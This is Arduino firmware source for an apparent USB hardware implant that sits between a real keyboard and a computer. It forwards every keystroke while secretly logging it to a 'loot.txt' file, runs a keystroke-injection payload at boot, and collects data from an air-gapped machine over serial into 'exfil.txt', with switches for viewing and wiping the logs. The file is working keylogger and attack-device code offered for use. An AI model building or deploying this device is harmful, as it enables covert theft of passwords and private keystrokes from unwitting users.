#include <USBCrowKeyboard.h>
#include "payload.h"
#include "config.h"
#include <LittleFS.h> 
#include "pio_usb.h"
#include "Adafruit_TinyUSB.h"

#define HOST_PIN_DP   16

#define MODIFIERKEY_LEFT_CTRL   (0x01)
#define MODIFIERKEY_LEFT_SHIFT  (0x02)
#define MODIFIERKEY_LEFT_ALT    (0x04)
#define MODIFIERKEY_LEFT_GUI    (0x08)
#define MODIFIERKEY_RIGHT_CTRL  (0x10)
#define MODIFIERKEY_RIGHT_SHIFT (0x20)
#define MODIFIERKEY_RIGHT_ALT   (0x40)
#define MODIFIERKEY_RIGHT_GUI   (0x80)
#define SHIFT   (0x80)
#define ALTGR   (0x40)

extern const uint8_t _asciimap[] PROGMEM;

// USB Host object
Adafruit_USBH_Host USBHost;

// holding device descriptor
tusb_desc_device_t desc_device;

#define MAX_REPORT  4

static uint8_t mod = 0;
uint8_t modifiersard=0;
uint8_t key;
uint8_t tmp_key;
int key_layout;
int key_modifier_layout;

// Keyboard
#define USE_ANSI_ESCAPE   0

// Each HID idx can has multiple reports
static struct {
  uint8_t report_count;
  tuh_hid_report_info_t report_info[MAX_REPORT];
} hid_info[CFG_TUH_HID];

void setup() {
  Serial.begin(115200);
  LittleFS.begin();
  Keyboard.begin();
  delay(1000);

  if (PAYLOAD_RUN) {
    payload();
  }

  if (FORMATFS) {
    delay(10000);
    LittleFS.format();
    Serial.println("FS FORMAT: OK");
  }

  if (KEYLOGGER_VIEWLOG) {
    delay(10000);
    File i = LittleFS.open("loot.txt", "r");
    Serial.println("LOOT.TXT FILE:");
    if (i) {
      while (i.available()) {
        Serial.write(i.read());
      }
      i.close();
    }
  }

  if (KEYLOGGER_DELETELOG) {
    delay(5500);
    File i = LittleFS.open("loot.txt", "w");
    
    if (i) {
      i.write("");
      Serial.println("KEYLOGGER DELETELOG: OK");
      i.close();
    }
  }

  if (EXFIL_VIEWLOG) {
    delay(10000);
    File i = LittleFS.open("exfil.txt", "r");
    Serial.println("EXFIL.TXT FILE:");
    if (i) {
      while (i.available()) {
        Serial.write(i.read());
      }
      i.close();
    }
  }

  if (EXFIL_DELETELOG) {
    delay(5500);
    File i = LittleFS.open("exfil.txt", "w");
    
    if (i) {
      i.write("");
      Serial.println("EXFIL DELETELOG: OK");
      i.close();
    }
  }
}

void loop() {
  if (EXFIL) {
    while (Serial.available()) {
      String airgap = Serial.readString();
      Serial.println(airgap);

      File f = LittleFS.open("exfil.txt", "a");
      if (f) {
        f.println(airgap);
        f.close();
      }
    }
  }
}

void setup1() { 
  if (KEYLOGGER) {
    Serial.println("Core1 setup to run TinyUSB host with pio-usb");

    uint32_t cpu_hz = clock_get_hz(clk_sys);
    if ( cpu_hz != 120000000UL && cpu_hz != 240000000UL ) {
      Serial.printf("Error: CPU Clock = %u, PIO USB require CPU clock must be multiple of 120 Mhz\r\n", cpu_hz);
      Serial.printf("Change your CPU Clock to either 120 or 240 Mhz in Menu->CPU Speed \r\n", cpu_hz);
    }

    pio_usb_configuration_t pio_cfg = PIO_USB_DEFAULT_CONFIG;
    pio_cfg.pin_dp = HOST_PIN_DP;
    USBHost.configure_pio_usb(1, &pio_cfg);
    USBHost.begin(1);
  }
}

void loop1() {
  if (KEYLOGGER) {
    USBHost.task();    
  }
}

void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* desc_report, uint16_t desc_len) {
  if (KEYLOGGER) {
    if ( !tuh_hid_receive_report(dev_addr, idx) ) {
      Serial.printf("Error: cannot request to receive report\r\n");
    }  
  }
}

void tuh_hid_report_received_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* report, uint16_t len) {
  if (KEYLOGGER) {
    uint8_t const itf_protocol = tuh_hid_interface_protocol(dev_addr, idx);

    switch (itf_protocol) {
      case HID_ITF_PROTOCOL_KEYBOARD:
        process_boot_kbd_report( (hid_keyboard_report_t const*) report );
      break;
    }

    if ( !tuh_hid_receive_report(dev_addr, idx) ) {
      Serial.printf("Error: cannot request to receive report\r\n");
    }
  }
}

void SetModifiersArd(void) {
  modifiersard=0;
  if(mod == 2) modifiersard = SHIFT;
  if(mod == 64) modifiersard = ALTGR;
};

void ProcessKeys(void) {
  if (key == KEY_RETURN) {
    Keyboard.write('\n');
  }
  else if (key == 82) {
    Keyboard.press(KEY_UP_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 81) {
    Keyboard.press(KEY_DOWN_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 80) {
    Keyboard.press(KEY_LEFT_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 79) {
    Keyboard.press(KEY_RIGHT_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 41) {
    Keyboard.press(KEY_ESC); delay(100);Keyboard.releaseAll();
  }
  else if (key == 73) {
    Keyboard.press(KEY_INSERT); delay(100);Keyboard.releaseAll();
  }
  else if (key == 77) {
    Keyboard.press(KEY_END); delay(100);Keyboard.releaseAll();
  }
  else if (key == 57) {
    Keyboard.press(KEY_CAPS_LOCK); delay(100);Keyboard.releaseAll();
  }
  else if (key == 70) {
    Keyboard.press(KEY_PRINT_SCREEN); delay(100);Keyboard.releaseAll();
  }
  else if (key == 58) {
    Keyboard.press(KEY_F1); delay(100);Keyboard.releaseAll();
  }
  else if (key == 59) {
    Keyboard.press(KEY_F2); delay(100);Keyboard.releaseAll();
  }
  else if (key == 60) {
    Keyboard.press(KEY_F3); delay(100);Keyboard.releaseAll();
  }
  else if (key == 61) {
    Keyboard.press(KEY_F4); delay(100);Keyboard.releaseAll();
  }
  else if (key == 62) {
    Keyboard.press(KEY_F5); delay(100);Keyboard.releaseAll();
  }
  else if (key == 63) {
    Keyboard.press(KEY_F6); delay(100);Keyboard.releaseAll();
  }
  else if (key == 64) {
    Keyboard.press(KEY_F7); delay(100);Keyboard.releaseAll();
  }
  else if (key == 65) {
    Keyboard.press(KEY_F8); delay(100);Keyboard.releaseAll();
  }
  else if (key == 66) {
    Keyboard.press(KEY_F9); delay(100);Keyboard.releaseAll();
  }
  else if (key == 67) {
    Keyboard.press(KEY_F10); delay(100);Keyboard.releaseAll();
  }
  else if (key == 68) {
    Keyboard.press(KEY_F11); delay(100);Keyboard.releaseAll();
  }
  else if (key == 69) {
    Keyboard.press(KEY_F12); delay(100);Keyboard.releaseAll();
  }
  else if (key == 43) {
    Keyboard.press(KEY_TAB); delay(100);Keyboard.releaseAll();
  }
  else if (key == 42) {
    Keyboard.press(KEY_BACKSPACE); delay(100);Keyboard.releaseAll();
  }
}

void process_boot_kbd_report(hid_keyboard_report_t const *report) {
  if (KEYLOGGER) {
    hid_keyboard_report_t prev_report = { 0, 0, {0} };
    static bool prev_modifier_state = false;
    static bool modifier_changed = false;

    if(report->modifier) {
      for(uint8_t i=0; i<6; i++) {
        key = report->keycode[i];
      }
      mod = report->modifier;

      if(key == 0 && mod == 8) {
        Keyboard.press(KEY_LEFT_GUI);
      }
    }

    if(!report->modifier) {
      for(uint8_t i=0; i<6; i++) {
        if (report->keycode[i] ) {
          key = report->keycode[i];
          ProcessKeys();
          key_layout = key,HEX;

          for (int i = 0; i < 128; i++) {
            if(pgm_read_byte(_asciimap + i) == key_layout){
              Keyboard.write(i);
              File f = LittleFS.open("loot.txt", "a");
              if (f) {
                f.write((const uint8_t*)&i, sizeof(i));
                f.close();
              }
            }
          }
        }
      }
    }

    bool current_modifier_state = (report->modifier != 0);

    current_modifier_state = (report->modifier != 0);

    if (current_modifier_state != prev_modifier_state) {
      if (current_modifier_state) {
        Serial.println("MODIFIER PRESSED");
        mod = report->modifier;
        modifier_changed = true;
      } else {
        Serial.println("MODIFIER RELEASED");
        delay(100);
        Keyboard.releaseAll();
        static bool key_pressed = false;
 
        modifier_changed = true;
        mod = 0;

      }
      prev_modifier_state = current_modifier_state;
    }

    if (modifier_changed || current_modifier_state) {
      for (uint8_t i = 0; i < 6; i++) {
        if (report->keycode[i]) {
          key = report->keycode[i];
          SetModifiersArd();
          key_modifier_layout = key|modifiersard,HEX;

          for (int i = 0; i < 128; i++) {
            if(pgm_read_byte(_asciimap + i) == key_modifier_layout){
              File f = LittleFS.open("loot.txt", "a");
              if (f) {
                f.write((const uint8_t*)&i, sizeof(i));
                f.close();
              }
            }
          }

          Keyboard.rawpress(key, mod);
          delay(100);
          Keyboard.rawrelease(key, mod);
        
        }
      }
      modifier_changed = false;
    }

    prev_report = *report;
  }
}
